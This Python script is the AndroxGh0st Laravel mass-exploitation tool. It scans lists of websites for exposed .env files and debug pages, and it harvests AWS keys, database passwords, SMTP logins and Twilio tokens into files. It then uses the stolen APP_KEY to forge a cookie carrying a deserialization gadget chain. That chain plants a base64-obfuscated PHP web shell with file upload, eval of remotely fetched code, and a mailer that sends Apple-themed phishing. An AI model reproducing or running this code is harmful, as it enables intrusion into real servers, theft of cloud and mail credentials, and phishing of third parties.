    # -*- coding: utf-8 -*-
    ''' So many people who love you. Don't focus on the people who don't. xD '''
     
    import hmac, hashlib, json, requests, re, threading, time, random, sys, os, urlparse
    requests.packages.urllib3.disable_warnings()
    from threading import *
    from threading import Thread
    from ConfigParser import ConfigParser
    from Queue import Queue
    from hashlib import sha256
    from base64 import b64decode
    from base64 import b64encode
    from Crypto import Random
    from Crypto.Cipher import AES
     
    # output name configure
    o_aws_access = 'aws_access.txt'
    o_aws_screet = 'aws_screet.txt'
    o_database = 'database.txt'
    o_database_root = 'database_root.txt'
    o_smtp = 'smtp.txt'
    o_twilio = 'twilio.txt'
    o_shell = 'shell_results.txt'
    o_unvuln = 'not_vulnerable.txt'
    pid_restore = '.androxgh0st_laravel'
    progres = 0
     
    BLOCK_SIZE = 16
    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                    chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
    unpad = lambda s: s[:-ord(s[len(s) - 1:])]
     
    class Worker(Thread):
        def __init__(self, tasks):
            Thread.__init__(self)
            self.tasks = tasks
            self.daemon = True
            self.start()
     
        def run(self):
            while True:
                func, args, kargs = self.tasks.get()
                try: func(*args, **kargs)
                except Exception, e: print e
                self.tasks.task_done()
     
    class ThreadPool:
        def __init__(self, num_threads):
            self.tasks = Queue(num_threads)
            for _ in range(num_threads): Worker(self.tasks)
     
        def add_task(self, func, *args, **kargs):
            self.tasks.put((func, args, kargs))
     
        def wait_completion(self):
            self.tasks.join()
     
    class androxgh0st:
        ''' There is no failure except in no longer trying. xD '''  
        def encrypt(self, raw, key):
            raw = pad(raw)
            iv = Random.new().read(AES.block_size)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            rawco = cipher.encrypt(raw)
            mac = hmac.new(key, b64encode(iv)+b64encode(rawco), hashlib.sha256).hexdigest()
            value = b64encode(rawco)
            iv = b64encode(iv)
            data = {}
            data['iv'] = str(iv)
            data['value'] = str(value)
            data['mac'] = str(mac)
            json_data = json.dumps(data)
            return  json_data
     
        def get_aws_data(self, text, url):
            try:
                if "AWS_ACCESS_KEY_ID" in text:
                    if "AWS_ACCESS_KEY_ID=" in text:
                        aws_key = re.findall("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
                        aws_sec = re.findall("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
                        aws_reg = re.findall("\nAWS_REGION=(.*?)\n", text)[0]
                    elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
                        aws_key = re.findall("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                        aws_sec = re.findall("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                        aws_reg = re.findall("<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    if aws_key == "" and aws_sec == "":
                        return False
                    else:
                        pack = str(url) + '|' + str(aws_sec) + '|' + str(aws_key) + '|' + str(aws_reg)
                        babi = str(pack).replace('\r', '')
                        save = open(o_aws_access, 'a')
                        save.write(babi + '\n')
                        save.close()
                    return True
                elif "AWS_KEY" in text:
                    if "AWS_KEY=" in text:
                        aws_key = re.findall("\nAWS_KEY=(.*?)\n", text)[0]
                        aws_sec = re.findall("\nAWS_SECRET=(.*?)\n", text)[0]
                        aws_reg = re.findall("\nAWS_REGION=(.*?)\n", text)[0]
                        aws_buc = re.findall("\nAWS_BUCKET=(.*?)\n", text)[0]
                    elif "<td>AWS_KEY</td>" in text:
                        aws_key = re.findall("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                        aws_sec = re.findall("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                        aws_reg = re.findall("<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                        aws_buc = re.findall("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                    if aws_key == "" and aws_sec == "":
                        return False
                    else:
                        pack = str(url) + '|' + str(aws_sec) + '|' + str(aws_key) + '|' + str(aws_reg) + '|' + str(aws_buc)
                        babi = str(pack).replace('\r', '')
                        save = open(o_aws_screet, 'a')
                        save.write(babi + '\n')
                        save.close()
                    return True
                else:
                    return False
            except:
                return False
     
        def get_database(self, text, url):
            try:
                if "DB_USERNAME" in text:
                    if "DB_USERNAME=" in text:
                        dbhost = re.findall("\nDB_HOST=(.*?)\n", text)[0]
                        dbport = re.findall("\nDB_PORT=(.*?)\n", text)[0]
                        dbuser = re.findall("\nDB_USERNAME=(.*?)\n", text)[0]
                        dbpass = re.findall("\nDB_PASSWORD=(.*?)\n", text)[0]
                    elif "<td>DB_USERNAME</td>" in text:
                        dbhost = re.findall('<td>DB_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                        dbport = re.findall('<td>DB_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                        dbuser = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                        dbpass = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    if dbuser == "null" or dbpass == "null":
                        return False
                    else:
                        if str(dbuser) == "root":
                            pack = str(url) + '|' + str(dbhost) + '|' + str(dbport) + '|' + str(dbuser) + '|' + str(dbpass)
                            save = open(o_database_root, 'a')
                            babi = str(pack).replace('\r', '')
                            save.write(babi + '\n')
                            save.close()
                        else:
                            pack = str(url) + '|' + str(dbhost) + '|' + str(dbport) + '|' + str(dbuser) + '|' + str(dbpass)
                            save = open(o_database, 'a')
                            babi = str(pack).replace('\r', '')
                            save.write(babi + '\n')
                            save.close()
                        return True
                else:
                    return False
            except:
                return False
     
     
        def get_env(self, text, url):
            #headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
            #text = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
            if "APP_KEY" in text:
                if "APP_KEY=" in text:
                    appkey = re.findall("APP_KEY=([a-zA-Z0-9:;\/\\=$%^&*()-+_!@#]+)", text)[0]
                else:
                    #text = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
                    if "<td>APP_KEY</td>" in text:
                        appkey = re.findall("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
                if appkey:
                    if '"' in appkey or "'" in appkey:
                        appkey = appkey[1:-1]
                    return appkey
                else:
                    return False
            else:
                return False
     
        def get_smtp(self, text, url):
            try:
                if "MAIL_HOST" in text:
                    if "MAIL_HOST=" in text:
                        mailhost = re.findall("\nMAIL_HOST=(.*?)\n", text)[0]
                        mailport = re.findall("\nMAIL_PORT=(.*?)\n", text)[0]
                        mailuser = re.findall("\nMAIL_USERNAME=(.*?)\n", text)[0]
                        mailpass = re.findall("\nMAIL_PASSWORD=(.*?)\n", text)[0]
                    elif "<td>MAIL_HOST</td>" in text:
                        mailhost = re.findall('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                        mailport = re.findall('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                        mailuser = re.findall('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                        mailpass = re.findall('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    if mailuser == "null" or mailpass == "null" or mailuser == "" or mailpass == "":
                        return False
                    else:
                        pack = str(url) + '|' + str(mailhost) + '|' + str(mailport) + '|' + str(mailuser) + '|' + str(mailpass)
                        save = open(o_smtp, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                        return True
                else:
                    return False
            except:
                return False
     
        def get_twilio(self, text, url):
            try:
                if "TWILIO_ACCOUNT_SID" in text:
                    if "TWILIO_ACCOUNT_SID=" in text:
                        twilio_acc_sid = re.findall("\nTWILIO_ACCOUNT_SID=(.*?)\n", text)[0]
                        twilio_auth = re.findall("\nTWILIO_AUTH_TOKEN=(.*?)\n", text)[0]
                        twilio_phone = re.findall("\nTWILIO_PHONE=(.*?)\n", text)[0]
                        twilio_sid = re.findall("\nTWILIO_SID=(.*?)\n", text)[0]
                    elif "<td>MAIL_HOST</td>" in text:
                        twilio_acc_sid = re.findall('<td>TWILIO_ACCOUNT_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                        twilio_auth = re.findall('<td>TWILIO_AUTH_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                        twilio_phone = re.findall('<td>TWILIO_PHONE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                        twilio_sid = re.findall('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    if twilio_acc_sid == "null" or twilio_auth == "null" or twilio_acc_sid == "" or twilio_auth == "":
                        return False
                    else:
                        pack = 'URL: '+str(url)+'\nTWILIO_ACCOUNT_SID: '+str(twilio_acc_sid)+'\nTWILIO_AUTH_TOKEN: '+str(twilio_auth)+'\nTWILIO_PHONE: '+str(twilio_phone)+'\nTWILIO_SID: '+str(twilio_sid)+'\n'
                        save = open(o_twilio, 'a')
                        babi = str(pack).replace('\r', '')
                        save.write(babi + '\n')
                        save.close()
                        return True
                else:
                    return False
            except:
                return False
     
    def printf(text):
        ''.join([str(item) for item in text])
        print(text + '\n'),
     
    def exploit(url):
        global progres
        resp = False
        try:
            text = '\033[32;1m#\033[0m '+url
            headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
            get_source = requests.get(url+"/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
            if "APP_KEY=" in get_source:
                resp = get_source
            else:
                get_source = requests.post(url, data={"0x[]":"androxgh0st"}, headers=headers, timeout=8, verify=False, allow_redirects=False).text
                if "<td>APP_KEY</td>" in get_source:
                    resp = get_source
            if resp:
                getsmtp = androxgh0st().get_smtp(resp, url)
                twilio = androxgh0st().get_twilio(resp, url)
                getkey = androxgh0st().get_env(resp, url)
                getdb = androxgh0st().get_database(resp, url)
                getaws = androxgh0st().get_aws_data(resp, url)
                if getsmtp:
                    text += ' | \033[32;1mSMTP\033[0m'
                else:
                    text += ' | \033[31;1mSMTP\033[0m'
                if twilio:
                    text += ' | \033[32;1mTWILIO API\033[0m'
                else:
                    text += ' | \033[31;1mTWILIO API\033[0m'
                if getdb:
                    text += ' | \033[32;1mDATABASE\033[0m'
                else:
                    text += ' | \033[31;1mDATABASE\033[0m'
                if getaws:
                    text += ' | \033[32;1mAWS\033[0m'
                else:
                    text += ' | \033[31;1mAWS\033[0m'
                if getkey:
                    api_key = getkey.replace('base64:', '')
                    key = b64decode(api_key)
                    xnxx = androxgh0st().encrypt(msg6, key)
                    matamu = b64encode(str(xnxx))
                    cokk = {"XSRF-TOKEN": matamu}
                    curler = requests.get(url, cookies=cokk, verify=False, timeout=8, headers=headers).text
                    y = curler.split("</html>")[1]
                    cekshell = requests.get(url + '/Chitoge.php?Chitoge', verify=False, timeout=8, headers=headers).text
                    if 'Chitoge kirisaki' in cekshell:
                        text += ' | \033[32;1mRCE\033[0m'
                        save = open(o_shell, 'a')
                        save.write(url + '/Chitoge.php?Chitoge' + '\n')
                        save.close()
                    else:
                        text += ' | \033[31;1mRCE\033[0m'
                        save =open(o_unvuln, 'a')
                        save.write(url + '\n')
                        save.close()
                else:
                    text += ' | \033[31;1mCan\'t get everything\033[0m'
                    save =open(o_unvuln, 'a')
                    save.write(url + '\n')
                    save.close()
            else:
                text += ' | \033[31;1mCan\'t get everything\033[0m'
                save =open(o_unvuln, 'a')
                save.write(url + '\n')
                save.close()
        except Exception as err:
            text = '\033[31;1m#\033[0m '+url
            text += ' | \033[31;1mCan\'t access sites\033[0m '
            save =open(o_unvuln, 'a')
            save.write(url + '\n')
            save.close()
        progres = progres + 1
        printf(str(progres) + text)
     
     
    # PHP Payload
    p = '<?php $root = $_SERVER["DOCUMENT_ROOT"]; $myfile = fopen($root . "/rss.php", "w") or die("Unable to open file!"); $code = "PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwoKaWYoaXNzZXQoJF9HRVRbIkNoaXRvZ2UiXSkpIHsKCSRyb290ID0gJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXTsKCWVjaG8gIjxoMT48aT5DaGl0b2dlIGtpcmlzYWtpIDwzPC9pPjwvaDE+PGJyPiI7CgllY2hvICI8Yj48cGhwdW5hbWU+Ii5waHBfdW5hbWUoKS4iPC9waHB1bmFtZT48L2I+PGJyPiI7CgllY2hvICI8IS0tIDxiPjxkb2Nyb290PiIuJHJvb3QuIjwvZG9jcm9vdD48L2I+PGJyPiAtLT4iOwoJZWNobyAiPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4KCQkgIDxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSdpZHhfZmlsZSc+CgkJICA8aW5wdXQgdHlwZT0nc3VibWl0JyBuYW1lPSd1cGxvYWQnIHZhbHVlPSd1cGxvYWQnPgoJCSAgPC9mb3JtPiI7CgkkZmlsZXMgPSAkX0ZJTEVTWydpZHhfZmlsZSddWyduYW1lJ107CgkkZGVzdCA9ICRyb290LicvJy4kZmlsZXM7CglpZihpc3NldCgkX1BPU1RbJ3VwbG9hZCddKSkgewoJCWlmKGlzX3dyaXRhYmxlKCRyb290KSkgewoJCQlpZihAY29weSgkX0ZJTEVTWydpZHhfZmlsZSddWyd0bXBfbmFtZSddLCAkZGVzdCkpIHsKCQkJCSR3ZWIgPSAiaHR0cDovLyIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwoJCQkJZWNobyAiU3Vrc2VzIC0+IDxhIGhyZWY9JyR3ZWIvJGZpbGVzJyB0YXJnZXQ9J19ibGFuayc+PGI+PHU+JHdlYi8kZmlsZXM8L3U+PC9iPjwvYT4iOwoJCQl9IGVsc2UgewoJCQkJZWNobyAiZ2FnYWwgdXBsb2FkIGRpIGRvY3VtZW50IHJvb3QuIjsKCQkJfQoJCX0gZWxzZSB7CgkJCWlmKEBjb3B5KCRfRklMRVNbJ2lkeF9maWxlJ11bJ3RtcF9uYW1lJ10sICRmaWxlcykpIHsKCQkJCWVjaG8gInN1a3NlcyB1cGxvYWQgPGI+JGZpbGVzPC9iPiBkaSBmb2xkZXIgaW5pIjsKCQkJfSBlbHNlIHsKCQkJCWVjaG8gImdhZ2FsIHVwbG9hZCI7CgkJCX0KCQl9Cgl9Cn0gZWxzZWlmKGlzc2V0KCRfR0VUWyJLaXJpc2FraSJdKSl7CgkkaG9tZWUgPSAkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddOwoJJGNnZnMgPSBleHBsb2RlKCIvIiwkaG9tZWUpOwoJJGJ1aWxkID0gJy8nLiRjZ2ZzWzFdLicvJy4kY2dmc1syXS4nLy5jYWdlZnMnOwoJaWYoaXNfZGlyKCRidWlsZCkpIHsKCQllY2hvKCJDbG91ZExpbnV4ID0+IFRydWUiKTsKCX0gZWxzZSB7CgkJZWNobygiQ2xvdWRMaW51eCA9PiBGYWxzZSIpOwoJfQoKCWlmKHN0cnBvcygncHVibGljJywgJGhvbWVlKSA9PSBUcnVlKSB7CgkJJGRpcnMgPSBzdHJfcmVwbGFjZSgicHVibGljIiwgIiIsICRob21lZSkuIi92ZW5kb3IvYXdzIjsKCQkkZGlyczIgPSBzdHJfcmVwbGFjZSgicHVibGljIiwgIiIsICRob21lZSkuIi92ZW5kb3IvYXdzLXNkay1waHAiOwoJCWlmKGlzX2RpcigkZGlycykpIHsKCQkJZWNobygnPGJyPkFXUyBTREsgPT4gVHJ1ZScpOwoJCX0KCQllbHNlaWYoaXNfZGlyKCRkaXJzMikpIHsKCQkJZWNobygnPGJyPkFXUyBTREsgPT4gVHJ1ZScpOwoJCX0KCQllbHNlIHsKCQkJZWNobygnPGJyPkFXUyBTREsgPT4gRmFsc2UnKTsKCQl9Cgl9IGVsc2UgewoJCSRkaXJzID0gJGhvbWVlLiIvdmVuZG9yL2F3cyI7CgkJJGRpcnMyID0gJGhvbWVlLiIvdmVuZG9yL2F3cy1zZGstcGhwIjsKCQlpZihpc19kaXIoJGRpcnMpKSB7CgkJCWVjaG8oJzxicj5BV1MgU0RLID0+IFRydWUnKTsKCQl9CgkJZWxzZWlmKGlzX2RpcigkZGlyczIpKSB7CgkJCWVjaG8oJzxicj5BV1MgU0RLID0+IFRydWUnKTsKCQl9CgkJZWxzZSB7CgkJCWVjaG8oJzxicj5BV1MgU0RLID0+IEZhbHNlJyk7CgkJfQoJfQoKfSBlbHNlaWYgKGlzc2V0KCRfR0VUWydCbGF6ZSddKSkgewoJZXZhbChiYXNlNjRfZGVjb2RlKCdablZ1WTNScGIyNGdZV1J0YVc1bGNpZ2tkWEpzTENBa2FYTnBLU0I3Q2lBZ0lDQWdJQ0FnSkdad0lEMGdabTl3Wlc0b0pHbHphU3dnSW5jaUtUc0tJQ0FnSUNBZ0lDQWtZMmdnUFNCamRYSnNYMmx1YVhRb0tUc0tJQ0FnSUNBZ0lDQmpkWEpzWDNObGRHOXdkQ2drWTJnc0lFTlZVa3hQVUZSZlZWSk1MQ0FrZFhKc0tUc0tJQ0FnSUNBZ0lDQmpkWEpzWDNObGRHOXdkQ2drWTJnc0lFTlZVa3hQVUZSZlFrbE9RVkpaVkZKQlRsTkdSVklzSUhSeWRXVXBPd29nSUNBZ0lDQWdJR04xY214ZmMyVjBiM0IwS0NSamFDd2dRMVZTVEU5UVZGOVNSVlJWVWs1VVVrRk9VMFpGVWl3Z2RISjFaU2s3Q2lBZ0lDQWdJQ0FnWTNWeWJGOXpaWFJ2Y0hRb0pHTm9MQ0JEVlZKTVQxQlVYMU5UVEY5V1JWSkpSbGxRUlVWU0xDQm1ZV3h6WlNrN0NpQWdJQ0FnSUNBZ1kzVnliRjl6WlhSdmNIUW9KR05vTENCRFZWSk1UMUJVWDBaSlRFVXNJQ1JtY0NrN0NpQWdJQ0FnSUNBZ2NtVjBkWEp1SUdOMWNteGZaWGhsWXlna1kyZ3BPd29nSUNBZ0lDQWdJR04xY214ZlkyeHZjMlVvSkdOb0tUc0tJQ0FnSUNBZ0lDQm1ZMnh2YzJVb0pHWndLVHNLSUNBZ0lDQWdJQ0J2WWw5bWJIVnphQ2dwT3dvZ0lDQWdJQ0FnSUdac2RYTm9LQ2s3Q24wS2FXWW9ZV1J0YVc1bGNpZ25hSFIwY0hNNkx5OXlZWGN1WjJsMGFIVmlkWE5sY21OdmJuUmxiblF1WTI5dEwyczBiREJ1YXk5emFETnNiQzl0WVdsdUwzaHRiQzV3YUhBbkxDZDRiV3d1Y0dod0p5a3BJSHNLSUNBZ0lDQWdJQ0JsWTJodklDSnJOR3d3Ym1zaU93cDlJR1ZzYzJVZ2V3b2dJQ0FnSUNBZ0lHVmphRzhnSW14dlkyRnNhRzl6ZENJN0NuMD0nKSk7Cn0gZWxzZWlmIChpc3NldCgkX0dFVFsiZW1haWwiXSkpIHsKCSRuYW1lID0gIkFwcGxlIjsgJHRvID0gJF9HRVRbImVtYWlsIl07ICR3ZWI9IiRfU0VSVkVSW0hUVFBfSE9TVF0iOyAKCSRzdWJqZWN0ID0gIllvdXIgQXBwbGUgSUQgd2FzIHVzZWQgdG8gc2lnbiBpbiB0byBpQ2xvdWQgdmlhIGEgd2ViIGJyb3dzZXIiOyAKCSRlbWFpbCA9ICJBcHBsZUAkd2ViIjsgCgkkaGVhZGVycyA9ICdGcm9tOiAnIC4KCSRlbWFpbCAuICJcclxuIi4gCgkkaGVhZGVycyA9ICJDb250ZW50LXR5cGU6IHRleHQvaHRtbFxyXG4iOyAnUmVwbHktVG86ICcgLiAKCSRlbWFpbC4gIlxyXG4iIC4gJ1gtTWFpbGVyOiBQSFAvJyAuIHBocHZlcnNpb24oKTsgCglpZiAobWFpbCgkdG8sCgkkc3ViamVjdCwKCSRib2R5LAoJJGhlYWRlcnMsJG5hbWUpKSAKCXsgZWNobygiRW1haWwgc2VudCB0byA9PiAkdG8iKTsgCgl9IGVsc2UgCgl7IAoJZWNobygiTm90IHN1cHBvcnQgZm9yIG1haWxlciIpOyB9Cn0gZWxzZSB7CgloZWFkZXIoJ0hUVFAvMS4xIDQwMyBGb3JiaWRkZW4nKTsKfQo/Pg=="; fwrite($myfile, base64_decode($code)); fclose($myfile); echo("Chitoge kirisaki?! Tsundere,kawaii <3"); ?>'
    msg6 = 'O:29:"Illuminate\Support\MessageBag":2:{s:11:"' + "\x00" + '*' + "\x00" + 'messages";a:0:{}s:9:"' + "\x00" + '*' + "\x00" + 'format";O:40:"Illuminate\Broadcasting\PendingBroadcast":2:{s:9:"' + "\x00" + '*' + "\x00" + 'events";O:25:"Illuminate\Bus\Dispatcher":1:{s:16:"' + "\x00" + '*' + "\x00" + 'queueResolver";a:2:{i:0;O:25:"Mockery\Loader\EvalLoader":0:{}i:1;s:4:"load";}}s:8:"' + "\x00" + '*' + "\x00" + 'event";O:38:"Illuminate\Broadcasting\BroadcastEvent":1:{s:10:"connection";O:32:"Mockery\Generator\MockDefinition":2:{s:9:"' + "\x00" + '*' + "\x00" + 'config";O:35:"Mockery\Generator\MockConfiguration":1:{s:7:"' + "\x00" + '*' + "\x00" + 'name";s:7:"abcdefg";}s:7:"' + "\x00" + '*' + "\x00" + 'code";s:' + str(len(p)) + ':"' + p + '";}}}}'
     
    if __name__ == '__main__':
        print('''
       ________    _ __  ____           
      / ____/ /_  (_) /_/ __ \____ ____ 
     / /   / __ \/ / __/ / / / __ `/ _ \\
    / /___/ / / / / /_/ /_/ / /_/ /  __/
    \____/_/ /_/_/\__/\____/\__, /\___/ 
        LARAVEL \033[32;1mRCE\033[0m V6.9   /____/       \n''')
        try:
            readcfg = ConfigParser()
            readcfg.read(pid_restore)
            lists = readcfg.get('DB', 'FILES')
            numthread = readcfg.get('DB', 'THREAD')
            sessi = readcfg.get('DB', 'SESSION')
            print("log session bot found! restore session")
            print('''Using Configuration :\n\tFILES='''+lists+'''\n\tTHREAD='''+numthread+'''\n\tSESSION='''+sessi)
            tanya = raw_input("Want to contineu session ? [Y/n] ")
            if "Y" in tanya or "y" in tanya:
                lerr = open(lists).read().split("\n"+sessi)[1]
                readsplit = lerr.splitlines()
            else:
                kntl # Send Error Biar Lanjut Ke Wxception :v
        except:
            try:
                lists = sys.argv[1]
                numthread = sys.argv[2]
                readsplit = open(lists).read().splitlines()
            except:
                try:
                    lists = raw_input("websitelist ? ")
                    readsplit = open(lists).read().splitlines()
                except:
                    print("Wrong input or list not found!")
                    exit()
                try:
                    numthread = raw_input("threads ? ")
                except:
                    print("Wrong thread number!")
                    exit()
        pool = ThreadPool(int(numthread))
        for url in readsplit:
            if "://" in url:
                url = url
            else:
                url = "http://"+url
            if url.endswith('/'):
                url = url[:-1]
            jagases = url
            try:
                pool.add_task(exploit, url)
            except KeyboardInterrupt:
                session = open(pid_restore, 'w')
                cfgsession = "[DB]\nFILES="+lists+"\nTHREAD="+str(numthread)+"\nSESSION="+jagases+"\n"
                session.write(cfgsession)
                session.close()
                print("CTRL+C Detect, Session saved")
                exit()
        pool.wait_completion()
        try:
            os.remove(pid_restore)
        except:
            pass
     
